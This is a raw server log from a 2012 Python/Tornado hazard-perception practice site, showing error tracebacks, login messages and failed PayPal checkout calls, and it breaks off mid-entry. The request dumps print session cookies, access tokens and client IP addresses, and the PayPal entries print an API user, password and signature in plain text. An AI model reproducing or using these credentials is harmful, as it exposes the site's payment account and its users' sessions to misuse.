HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%2217.407823%22%2C%2222.128163%22%2C%2222.640022%22%2C%2226.648117%22%2C%2227.28%22%2C%2227.848004%22%2C%2265.96%22%2C%2275.440612%22%2C%2277.120498%22%2C%2280.320408%22%2C%2282.16034%22%2C%2283.080294%22%2C%2284.480249%22%2C%2285.520272%22%2C%2287.400204%22%2C%2288.280136%22%5D&cid=intro&_xsrf=aaa17ca546524b04804195abe6dc963d', headers={'Referer': 'http://www.intheory.co.uk/learn/hazard/clip/intro', 'Content-Length': '339', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.22.66.2', 'Cookie': '_xsrf=aaa17ca546524b04804195abe6dc963d; __utma=188782963.1068011429.1350993246.1350993246.1350993246.1; __utmb=188782963.5.10.1350993246; __utmc=188782963; __utmz=188782963.1350993246.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=hazard%20perception%20uk%20practice%202012; access_token="S2F0ZQ==|1350993320|4835f2e73461a53f9a7d0c065d3c9fb6571ce4e6"; user_type="aW50aGVvcnk=|1350993320|d461491041623ef4d4e964b0c43e936faa2b1aba"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 13.42ms
global name 'math' is not defined
WARNING:intheory-8001:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%2210.550000190734863%22%2C%2219.59000015258789%22%2C%2225.025999069213867%22%2C%2235.18662643432617%22%2C%2242.040000915527344%22%2C%2251.01499938964844%22%2C%2253.73500061035156%22%2C%2259.2140007019043%22%2C%2265.49700164794922%22%2C%2269.6989974975586%22%5D&cid=507493338e4c850ece772bca&_xsrf=e404e179442b43578c36e8cc1065ef7b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '340', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bca', 'X-Real-Ip': '78.146.213.204', 'Cookie': '_xsrf=e404e179442b43578c36e8cc1065ef7b; access_token=a2F5YWx2aWx5|1350993177|b0fb385d581b10118bd60feeffbac89dc9efe4c6; user_type="aW50aGVvcnk=|1350993177|f4c8eb0fc7c35c443c1d7145ec346392cdc53b51"; __utma=188782963.651186145.1350993055.1350993055.1350993055.1; __utmb=188782963.15.10.1350993055; __utmc=188782963; __utmz=188782963.1350993055.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=practical%20hazard%20perception%20test', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 17.46ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Intheory user with id 508686ee8e4c855002dbfdcc has successfully registered.
INFO:intheory-8001:Intheory user with id 508686ee8e4c855002dbfdcc has successfully registered.
Intheory user with id 5086870d8e4c85501c5038d5 has successfully registered.
INFO:intheory-8003:Intheory user with id 5086870d8e4c85501c5038d5 has successfully registered.
global name 'math' is not defined
WARNING:intheory-8000:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%225.994999885559082%22%2C%229.722999572753906%22%2C%2213.835000038146973%22%2C%2218.613000869750977%22%2C%2220.378999710083008%22%2C%2224.31399917602539%22%2C%2226.881000518798828%22%2C%2230.59000015258789%22%2C%2232.058998107910156%22%2C%2243.55400085449219%22%5D&cid=507493338e4c850ece772bcb&_xsrf=e404e179442b43578c36e8cc1065ef7b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '344', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bcb', 'X-Real-Ip': '78.146.213.204', 'Cookie': '_xsrf=e404e179442b43578c36e8cc1065ef7b; access_token=a2F5YWx2aWx5|1350993177|b0fb385d581b10118bd60feeffbac89dc9efe4c6; user_type="aW50aGVvcnk=|1350993177|f4c8eb0fc7c35c443c1d7145ec346392cdc53b51"; __utma=188782963.651186145.1350993055.1350993055.1350993055.1; __utmb=188782963.17.10.1350993055; __utmc=188782963; __utmz=188782963.1350993055.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=practical%20hazard%20perception%20test', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 36.82ms
global name 'math' is not defined
WARNING:intheory-8003:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%224.603000164031982%22%2C%2220.95800018310547%22%2C%2228.785999298095703%22%2C%2233.2760009765625%22%5D&cid=507493338e4c850ece772bcc&_xsrf=e404e179442b43578c36e8cc1065ef7b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '183', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bcc', 'X-Real-Ip': '78.146.213.204', 'Cookie': '_xsrf=e404e179442b43578c36e8cc1065ef7b; access_token=a2F5YWx2aWx5|1350993177|b0fb385d581b10118bd60feeffbac89dc9efe4c6; user_type="aW50aGVvcnk=|1350993177|f4c8eb0fc7c35c443c1d7145ec346392cdc53b51"; __utma=188782963.651186145.1350993055.1350993055.1350993055.1; __utmb=188782963.19.10.1350993055; __utmc=188782963; __utmz=188782963.1350993055.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=practical%20hazard%20perception%20test', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 16.04ms
Intheory user with id 508689bc8e4c85501c5038d9 has successfully registered.
INFO:intheory-8003:Intheory user with id 508689bc8e4c85501c5038d9 has successfully registered.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
intro is not a valid ObjectId
WARNING:intheory-8003:intro is not a valid ObjectId
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%5D&cid=intro&_xsrf=4f56610173a047dc82af89e71e7ea287', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '63', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazard/clip/intro', 'X-Real-Ip': '2.223.19.23', 'Cookie': '_xsrf=4f56610173a047dc82af89e71e7ea287; access_token="QUFBRzZsTmNzNkdjQkFJTUhIWkJmamI0aGI3ZGJHSzZaQk5HdEVrSHZVbndFcUh1d2RycDdNVmJCNnF3Um1qc2Y1c1haQ2N1bHBhOTUxcGpNVVlOUjRoWVNHRXBoSk9hck9nZXpXWXhtd1pEWkQ=|1350992984|ac37f8767df2db3b638ce144414d682d53a353b4"; user_type="ZmI=|1350992984|f0afd978fec362f0f5ef755140894150400f50f8"; __utma=188782963.752886800.1350996267.1350996267.1350996267.1; __utmb=188782963.26.9.1350997528454; __utmc=188782963; __utmz=188782963.1350996267.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=practice%20hazard%20perception%20test%202012%20online%20free', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 78.82ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
intro is not a valid ObjectId
WARNING:intheory-8003:intro is not a valid ObjectId
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%5D&cid=intro&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '63', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazard/clip/intro', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; access_token=QUFBRzZsTmNzNkdjQkFDWG9BQmllRndUWkF2QjFZWDJ5d3FaQ1pCVllwTWRybjRFcHVVSDBJdjhZbDVGWFByU04xTGMwQVhCRVVpMmRhdjhMOFFEYUdKa1dlUEpvN2taQjFMRTc0V1V0S3daRFpE|1350995499|7275dd1cef7a00686341bf17240494514cc410cc; user_type="ZmI=|1350995499|cf36f2bcf4c9049ac181aef8fe4626920ee1a2c1"; __utma=188782963.489109469.1349903373.1350945496.1350989279.28; __utmb=188782963.83.10.1350989279; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 120.40ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Intheory user with id 508694888e4c85604cb7f91b has successfully registered.
INFO:intheory-8000:Intheory user with id 508694888e4c85604cb7f91b has successfully registered.
Intheory user with id 508694a98e4c85605e80340f has successfully registered.
INFO:intheory-8002:Intheory user with id 508694a98e4c85605e80340f has successfully registered.
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 508696c28e4c8566fb0fc108 has successfully logged in.
INFO:intheory-8002:Facebook user with id 508696c28e4c8566fb0fc108 has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 508696c28e4c8566fb0fc108 has successfully logged in.
INFO:intheory-8000:Facebook user with id 508696c28e4c8566fb0fc108 has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
INFO:intheory-8002:Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
Intheory user with id 50869a128e4c8566fb0fc10c has successfully registered.
INFO:intheory-8002:Intheory user with id 50869a128e4c8566fb0fc10c has successfully registered.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 50869b968e4c8566eaccb719 has successfully logged in.
INFO:intheory-8001:Facebook user with id 50869b968e4c8566eaccb719 has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Intheory user with id 5086a2808e4c856efaed39ad has successfully registered.
INFO:intheory-8001:Intheory user with id 5086a2808e4c856efaed39ad has successfully registered.
Intheory user with id 5086a4b98e4c856efaed39af has successfully registered.
INFO:intheory-8001:Intheory user with id 5086a4b98e4c856efaed39af has successfully registered.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id 5086a5df8e4c856f0a0ccc61 has successfully logged in.
INFO:intheory-8002:Facebook user with id 5086a5df8e4c856f0a0ccc61 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id 5086aa678e4c856f0a0ccc64 has successfully logged in.
INFO:intheory-8002:Facebook user with id 5086aa678e4c856f0a0ccc64 has successfully logged in.
Facebook user with id 5086aa678e4c856f0a0ccc64 has successfully logged in.
INFO:intheory-8000:Facebook user with id 5086aa678e4c856f0a0ccc64 has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id 5086acea8e4c856efaed39b3 has successfully logged in.
INFO:intheory-8001:Facebook user with id 5086acea8e4c856efaed39b3 has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 156, in _save_user_profile
    c_user.username = response['username']
KeyError: 'username'
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
HTTP 403: Forbidden
ERROR:intheory-8002:HTTP 403: Forbidden
WARNING:root:403 GET /admin (127.0.0.1) 2.58ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Intheory user with id 5086b9328e4c856efaed39b8 has successfully registered.
INFO:intheory-8001:Intheory user with id 5086b9328e4c856efaed39b8 has successfully registered.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Intheory user with id 5086f5ea8e4c856f1484f7ee has successfully registered.
INFO:intheory-8003:Intheory user with id 5086f5ea8e4c856f1484f7ee has successfully registered.
Facebook user with id 5086537f8e4c8547f9331a33 has successfully logged in.
INFO:intheory-8001:Facebook user with id 5086537f8e4c8547f9331a33 has successfully logged in.
Error while completing payment: 'PAYMENTINFO_0_RECEIPTID'
WARNING:intheory-8001:Error while completing payment: 'PAYMENTINFO_0_RECEIPTID'
ERROR:paypal.interface:A PayPal API error was encountered.
ERROR:paypal.interface:PayPal NVP Query Key/Vals:
{'METHOD': 'DoExpressCheckoutPayment',
 'PAYERID': u'WUBB62C5VD9RJ',
 'PAYMENTREQUEST_0_AMT': u'7.49',
 'PAYMENTREQUEST_0_CURRENCYCODE': 'GBP',
 'PAYMENTREQUEST_0_DESC': 'Intheory Web App - \xc2\xa37.49 - Full Access',
 'PAYMENTREQUEST_0_PAYMENTACTION': 'Sale',
 'PWD': 'UZQZC8RD228TZEU4',
 'SIGNATURE': ('AA6FKP55XSbL3HvSeGi8V-Fb.Yv8A47KsUXj1CQw531s.vd-HCMVUsrL',),
 'TOKEN': u'EC-9XT229647P1272707',
 'USER': 'zahid_api1.intheory.co.uk',
 'VERSION': '72.0'}
ERROR:paypal.interface:PayPal NVP Query Response
ERROR:paypal.interface:{u'ACK': [u'Failure'],
 u'BUILD': [u'4072860'],
 u'CORRELATIONID': [u'e50e52b52b649'],
 u'L_ERRORCODE0': [u'10415'],
 u'L_LONGMESSAGE0': [u'A successful transaction has already been completed for this token.'],
 u'L_SEVERITYCODE0': [u'Error'],
 u'L_SHORTMESSAGE0': [u'Transaction refused because of an invalid argument. See additional error messages for details.'],
 u'TIMESTAMP': [u'2012-10-23T20:24:10Z'],
 u'VERSION': [u'72.0']}
Error while completing payment: u'A successful transaction has already been completed for this token.' (Error Code: 10415)
WARNING:intheory-8000:Error while completing payment: u'A successful transaction has already been completed for this token.' (Error Code: 10415)
ERROR:paypal.interface:A PayPal API error was encountered.
ERROR:paypal.interface:PayPal NVP Query Key/Vals:
{'METHOD': 'DoExpressCheckoutPayment',
 'PAYERID': u'WUBB62C5VD9RJ',
 'PAYMENTREQUEST_0_AMT': u'7.49',
 'PAYMENTREQUEST_0_CURRENCYCODE': 'GBP',
 'PAYMENTREQUEST_0_DESC': 'Intheory Web App - \xc2\xa37.49 - Full Access',
 'PAYMENTREQUEST_0_PAYMENTACTION': 'Sale',
 'PWD': 'UZQZC8RD228TZEU4',
 'SIGNATURE': ('AA6FKP55XSbL3HvSeGi8V-Fb.Yv8A47KsUXj1CQw531s.vd-HCMVUsrL',),
 'TOKEN': u'EC-9XT229647P1272707',
 'USER': 'zahid_api1.intheory.co.uk',
 'VERSION': '72.0'}
ERROR:paypal.interface:PayPal NVP Query Response
ERROR:paypal.interface:{u'ACK': [u'Failure'],
 u'BUILD': [u'4072860'],
 u'CORRELATIONID': [u'bf16a19e198db'],
 u'L_ERRORCODE0': [u'10415'],
 u'L_LONGMESSAGE0': [u'A successful transaction has already been completed for this token.'],
 u'L_SEVERITYCODE0': [u'Error'],
 u'L_SHORTMESSAGE0': [u'Transaction refused because of an invalid argument. See additional error messages for details.'],
 u'TIMESTAMP': [u'2012-10-23T20:26:52Z'],
 u'VERSION': [u'72.0']}
Error while completing payment: u'A successful transaction has already been completed for this token.' (Error Code: 10415)
WARNING:intheory-8003:Error while completing payment: u'A successful transaction has already been completed for this token.' (Error Code: 10415)
ERROR:paypal.interface:A PayPal API error was encountered.
ERROR:paypal.interface:PayPal NVP Query Key/Vals:
{'METHOD': 'DoExpressCheckoutPayment',
 'PAYERID': u'WUBB62C5VD9RJ',
 'PAYMENTREQUEST_0_AMT': u'7.49',
 'PAYMENTREQUEST_0_CURRENCYCODE': 'GBP',
 'PAYMENTREQUEST_0_DESC': 'Intheory Web App - \xc2\xa37.49 - Full Access',
 'PAYMENTREQUEST_0_PAYMENTACTION': 'Sale',
 'PWD': 'UZQZC8RD228TZEU4',
